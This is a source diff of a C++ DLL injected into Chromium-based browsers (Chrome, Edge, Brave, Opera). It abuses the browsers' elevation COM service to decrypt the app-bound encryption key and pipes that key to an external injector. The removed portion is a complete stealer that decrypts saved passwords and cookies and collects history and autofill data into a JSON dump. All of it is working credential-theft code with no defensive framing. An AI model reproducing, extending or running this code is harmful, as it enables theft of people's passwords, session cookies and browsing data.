+++ proxydll/src/lib.cpp
@@ -9,7 +9,6 @@
 #include <wincrypt.h>
 #include <shlobj.h>
 #include <objbase.h>
-#include "sqlite3.h"
 #include "json.hpp"
 #include <bcrypt.h>
 
@@ -30,46 +29,7 @@ void log_to_file(const std::string& msg) {
     }
 }
 
-std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
-    std::string output;
-    output.reserve(input.size());
-    for (unsigned char c : input) {
-        if (c < 32 && c != '\r' && c != '\n' && c != '\t') {
-            output += ' ';
-        } else {
-            output += (char)c;
-        }
-    }
-    return output;
-}
-
-std::string ensure_utf8(const std::string& input) {
-    std::string output;
-    output.reserve(input.size());
-    for (unsigned char c : input) {
-        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
-        else output += (char)c;
-    }
-    return output;
-}
-
-enum class Browser { Chrome, Edge, Brave };
-
-struct PasswordData { std::string url, username, password; };
-struct CookieData {
-    std::string host, name, value, path;
-    long long expires_utc;
-    int is_secure, is_httponly, samesite;
-};
-struct HistoryData { std::string url, title; int visit_count; };
-struct AutofillData { std::string name, value; };
-struct ProfileData {
-    std::string name;
-    std::vector<PasswordData> passwords;
-    std::vector<CookieData> cookies;
-    std::vector<HistoryData> history;
-    std::vector<AutofillData> autofill;
-};
+enum class Browser { Chrome, Edge, Brave, Opera, OperaGX };
 
 // COM Interface definitions
 struct IElevatorVTbl {
@@ -104,17 +64,6 @@ const GUID IID_EDGE_IELEVATOR2 = { 0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17
 const GUID CLSID_BRAVE_ELEVATOR = { 0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B} };
 const GUID IID_BRAVE_IELEVATOR1 = { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} };
 const GUID IID_BRAVE_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };
-
-std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
-    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
-    DATA_BLOB output = { 0, nullptr };
-    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
-        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
-        LocalFree(output.pbData);
-        return res;
-    }
-    return {};
-}
 
 std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& encrypted_blob, Browser browser) {
     GUID clsid;
@@ -162,44 +111,6 @@ std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char
     return res;
 }
 
-std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
-    if (data.size() < 15) return {};
-
-    BCRYPT_ALG_HANDLE h_alg = nullptr;
-    BCRYPT_KEY_HANDLE h_key = nullptr;
-    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
-    memset(&info, 0, sizeof(info));
-    info.cbSize = sizeof(info);
-    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
-
-    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
-    if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
-
-    if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
-
-    std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
-    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
-    std::vector<unsigned char> tag(data.end() - 16, data.end());
-
-    info.pbNonce = nonce.data();
-    info.cbNonce = nonce.size();
-    info.pbTag = tag.data();
-    info.cbTag = tag.size();
-
-    std::vector<unsigned char> plaintext(ciphertext.size());
-    DWORD cb_plain = 0;
-    if (BCryptDecrypt(h_key, ciphertext.data(), ciphertext.size(), &info, nullptr, 0, plaintext.data(), plaintext.size(), &cb_plain, 0) != 0) {
-        BCryptDestroyKey(h_key);
-        BCryptCloseAlgorithmProvider(h_alg, 0);
-        return {};
-    }
-
-    BCryptDestroyKey(h_key);
-    BCryptCloseAlgorithmProvider(h_alg, 0);
-    plaintext.resize(cb_plain);
-    return plaintext;
-}
-
 static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     int in_len = encoded_string.size();
@@ -228,44 +139,6 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     return ret;
 }
 
-std::string wstring_to_utf8(const std::wstring& wstr) {
-    if (wstr.empty()) return std::string();
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
-    std::string strTo(size_needed, 0);
-    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
-    return strTo;
-}
-
-bool copy_file_locked(const fs::path& source, const fs::path& dest) {
-    for (int i = 0; i < 3; i++) {
-        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
-        if (h_src != INVALID_HANDLE_VALUE) {
-            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
-            if (h_dest != INVALID_HANDLE_VALUE) {
-                char buffer[65536];
-                DWORD bytes_read, bytes_written;
-                bool has_data = false;
-                while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
-                    WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr);
-                    has_data = true;
-                }
-                CloseHandle(h_src);
-                CloseHandle(h_dest);
-                if (has_data) return true;
-            } else {
-                CloseHandle(h_src);
-            }
-        }
-        Sleep(200);
-    }
-    return false;
-}
-
-int open_db_readonly(const std::string& path, sqlite3** db) {
-    std::string uri = "file:" + path + "?mode=ro&nolock=1";
-    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
-}
-
 Browser get_browser() {
     wchar_t path[MAX_PATH];
     GetModuleFileNameW(nullptr, path, MAX_PATH);
@@ -273,270 +146,75 @@ Browser get_browser() {
     std::transform(s.begin(), s.end(), s.begin(), ::towlower);
     if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
     if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
+    if (s.find(L"opera.exe") != std::wstring::npos || s.find(L"launcher.exe") != std::wstring::npos) {
+        if (s.find(L"opera gx") != std::wstring::npos) return Browser::OperaGX;
+        return Browser::Opera;
+    }
     return Browser::Chrome;
 }
 
 void do_work() {
     try {
-        log_to_file("DLL Attached. Starting do_work()...");
+        log_to_file("DLL Attached. Starting v20 key extraction...");
         Browser browser = get_browser();
-        log_to_file("Browser detected: " + std::to_string((int)browser));
 
         char* user_profile_env = nullptr;
         size_t len = 0;
         _dupenv_s(&user_profile_env, &len, "USERPROFILE");
-        if (!user_profile_env) {
-            log_to_file("Error: USERPROFILE env var not found.");
-            return;
-        }
+        if (!user_profile_env) return;
         fs::path user_profile(user_profile_env);
         free(user_profile_env);
 
         fs::path data_path;
         if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
         else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
-        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
-
-        log_to_file("Data path: " + data_path.string());
+        else if (browser == Browser::Brave) data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
+        else if (browser == Browser::Opera) data_path = user_profile / "AppData/Roaming/Opera Software/Opera Stable";
+        else if (browser == Browser::OperaGX) data_path = user_profile / "AppData/Roaming/Opera Software/Opera GX Stable";
 
         std::string local_state_str;
-    std::ifstream ls_file(data_path / "Local State");
-    if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        std::ifstream ls_file(data_path / "Local State");
+        if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
 
-    json ls_json = json::parse(local_state_str, nullptr, false);
-    std::vector<unsigned char> v10_key, v20_key;
-
-    if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
-        std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
-        auto decoded = base64_decode(key_b64);
-        if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
-            log_to_file("Decrypting v10 key via DPAPI...");
-            v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
-            log_to_file("v10 key retrieval: " + std::string(v10_key.empty() ? "FAILED" : "SUCCESS"));
+        json ls_json = json::parse(local_state_str, nullptr, false);
+        std::string v20_b64;
+        if (!ls_json.is_discarded()) {
+            if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
+            else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
         }
-    }
 
-    std::string v20_b64;
-    if (!ls_json.is_discarded()) {
-        if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
-        else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
-    }
-    if (!v20_b64.empty()) {
-        log_to_file("Found app_bound_encrypted_key. Decrypting v20 key...");
+        if (v20_b64.empty()) {
+            log_to_file("No app_bound_encrypted_key found.");
+            return;
+        }
+
         auto decoded = base64_decode(v20_b64);
         std::vector<unsigned char> blob = (decoded.size() > 4 && std::string((char*)decoded.data(), 4) == "APPB") ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
-        v20_key = decrypt_with_elevator(blob, browser);
-        log_to_file("v20 key retrieval: " + std::string(v20_key.empty() ? "FAILED" : "SUCCESS"));
-    }
+        std::vector<unsigned char> v20_key = decrypt_with_elevator(blob, browser);
 
-    std::vector<std::string> profiles = { "Default" };
-    for (const auto& entry : fs::directory_iterator(data_path)) {
-        if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
-    }
-
-    json collected = json::array();
-    fs::path temp_dir = user_profile / "Desktop/chrome_db";
-    fs::create_directories(temp_dir);
-
-    log_to_file("Starting profile iteration. Profiles found: " + std::to_string(profiles.size()));
-
-    for (auto& profile : profiles) {
-        log_to_file("Processing profile: " + profile);
-        fs::path p_path = data_path / profile;
-        ProfileData p_data;
-        p_data.name = profile;
-
-        // Passwords
-        fs::path db_path = p_path / "Login Data";
-        fs::path tmp_db = temp_dir / "pass.tmp";
-        if (fs::exists(db_path)) {
-            if (copy_file_locked(db_path, tmp_db)) {
-                sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
-                    sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
-                            const char* t_user = (const char*)sqlite3_column_text(stmt, 1);
-                            std::string url = t_url ? t_url : "";
-                            std::string user = t_user ? t_user : "";
-                            const unsigned char* pass_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
-                            int pass_len = sqlite3_column_bytes(stmt, 2);
-                            std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
-
-                            bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
-                            auto& key = is_v20 ? v20_key : v10_key;
-                            if (!key.empty()) {
-                                auto dec = aes_gcm_decrypt(key, enc_pass);
-                                if (!dec.empty()) {
-                                    if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                    p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
-                                }
-                            }
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    sqlite3_close(db);
-                }
-            }
-            fs::remove(tmp_db);
+        if (v20_key.empty()) {
+            log_to_file("v20 key retrieval failed.");
+            return;
         }
 
-        // Cookies
-        db_path = p_path / "Network/Cookies";
-        if (!fs::exists(db_path)) db_path = p_path / "Cookies";
+        log_to_file("v20 key retrieved successfully. Sending to injector...");
 
-        tmp_db = temp_dir / "cook.tmp";
-        if (fs::exists(db_path)) {
-            if (copy_file_locked(db_path, tmp_db)) {
-                sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
-                    sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
-                            const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
-                            const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
-                            std::string host = t_host ? t_host : "";
-                            std::string name = t_name ? t_name : "";
-                            std::string path = t_path ? t_path : "";
-                            long long expires = sqlite3_column_int64(stmt, 3);
-                            int secure = sqlite3_column_int(stmt, 4);
-                            int httponly = sqlite3_column_int(stmt, 5);
-                            int samesite = sqlite3_column_int(stmt, 6);
-
-                            const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
-                            int enc_len = sqlite3_column_bytes(stmt, 7);
-                            std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
-
-                            bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
-                            auto& key = is_v20 ? v20_key : v10_key;
-                            if (!key.empty()) {
-                                auto dec = aes_gcm_decrypt(key, enc_val);
-                                if (!dec.empty()) {
-                                    if (dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
-                                    p_data.cookies.push_back({ host, name, to_utf8_lossy(dec), path, expires, secure, httponly, samesite });
-                                }
-                            }
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    sqlite3_close(db);
-                }
-            }
-            fs::remove(tmp_db);
-        }
-
-        // History
-        db_path = p_path / "History";
-        tmp_db = temp_dir / "hist.tmp";
-        if (fs::exists(db_path)) {
-            if (copy_file_locked(db_path, tmp_db)) {
-                sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
-                    sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
-                            const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
-                            p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    sqlite3_close(db);
-                }
-            }
-            fs::remove(tmp_db);
-        }
-
-        // Autofill
-        db_path = p_path / "Web Data";
-        tmp_db = temp_dir / "web.tmp";
-        if (fs::exists(db_path)) {
-            if (copy_file_locked(db_path, tmp_db)) {
-                sqlite3* db;
-                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
-                    sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
-                            const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
-                            p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    sqlite3_close(db);
-                }
-            }
-            fs::remove(tmp_db);
-        }
-
-        json pj;
-        try {
-        pj["name"] = ensure_utf8(p_data.name);
-        pj["passwords"] = json::array();
-        for (auto& p : p_data.passwords) pj["passwords"].push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}});
-        pj["cookies"] = json::array();
-        for (auto& c : p_data.cookies) pj["cookies"].push_back({
-            {"host", ensure_utf8(c.host)},
-            {"name", ensure_utf8(c.name)},
-            {"value", ensure_utf8(c.value)},
-            {"path", ensure_utf8(c.path)},
-            {"expires_utc", c.expires_utc},
-            {"is_secure", c.is_secure},
-            {"is_httponly", c.is_httponly},
-            {"samesite", c.samesite}
-        });
-        pj["history"] = json::array();
-        for (auto& h : p_data.history) pj["history"].push_back({{"url", ensure_utf8(h.url)}, {"title", ensure_utf8(h.title)}, {"visit_count", h.visit_count}});
-        pj["autofill"] = json::array();
-        for (auto& a : p_data.autofill) pj["autofill"].push_back({{"name", ensure_utf8(a.name)}, {"value", ensure_utf8(a.value)}});
-        log_to_file("Profile " + profile + " summary: " + std::to_string(p_data.passwords.size()) + " passwords, " + std::to_string(p_data.cookies.size()) + " cookies.");
-        collected.push_back(pj);
-        } catch (const std::exception& e) {
-            log_to_file("Error serializing profile " + profile + ": " + std::string(e.what()));
-        }
-    }
-
-    log_to_file("Attempting JSON dump...");
-    std::string s = collected.dump(-1, ' ', false, nlohmann::json::error_handler_t::replace);
-    log_to_file("Generated JSON dump of " + std::to_string(s.size()) + " bytes.");
-
-    HANDLE h_pipe = INVALID_HANDLE_VALUE;
-    for (int i = 0; i < 120; i++) {
-        h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-        if (h_pipe != INVALID_HANDLE_VALUE) break;
-
-        DWORD err = GetLastError();
-        if (err == ERROR_PIPE_BUSY) {
-            WaitNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", 1000);
-        } else {
-            if (i % 10 == 0) log_to_file("Pipe connection attempt " + std::to_string(i) + " failed. Error: " + std::to_string(err));
+        HANDLE h_pipe = INVALID_HANDLE_VALUE;
+        for (int i = 0; i < 60; i++) {
+            h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+            if (h_pipe != INVALID_HANDLE_VALUE) break;
             Sleep(500);
         }
-    }
 
-    if (h_pipe != INVALID_HANDLE_VALUE) {
-        log_to_file("Connected to named pipe. Attempting to send " + std::to_string(s.size()) + " bytes...");
-        DWORD written;
-        if (WriteFile(h_pipe, s.c_str(), (DWORD)s.size(), &written, nullptr)) {
-            if (FlushFileBuffers(h_pipe)) {
-                log_to_file("Data sent and flushed successfully: " + std::to_string(written) + " bytes.");
-                Sleep(1000); // Wait for injector to read
-            } else {
-                log_to_file("Data sent (" + std::to_string(written) + " bytes) but FlushFileBuffers failed: " + std::to_string(GetLastError()));
-            }
-        } else {
-            log_to_file("Error sending data via pipe: " + std::to_string(GetLastError()));
+        if (h_pipe != INVALID_HANDLE_VALUE) {
+            DWORD written;
+            WriteFile(h_pipe, v20_key.data(), (DWORD)v20_key.size(), &written, nullptr);
+            FlushFileBuffers(h_pipe);
+            CloseHandle(h_pipe);
+            log_to_file("v20 key sent via pipe.");
         }
-        CloseHandle(h_pipe);
-    } else {
-        log_to_file("Error: Could not connect to named pipe after 60 attempts. Error: " + std::to_string(GetLastError()));
-    }
-    } catch (const std::exception& e) {
-        log_to_file("Exception in do_work: " + std::string(e.what()));
     } catch (...) {
-        log_to_file("Unknown exception in do_work.");
+        log_to_file("Exception in DLL do_work.");
     }
 }
 
@@ -547,7 +225,6 @@ DWORD WINAPI thread_func(LPVOID) {
 
 extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        // Filter out sub-processes
         std::wstring cmd = GetCommandLineW();
         if (cmd.find(L"--type=") == std::wstring::npos) {
             HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
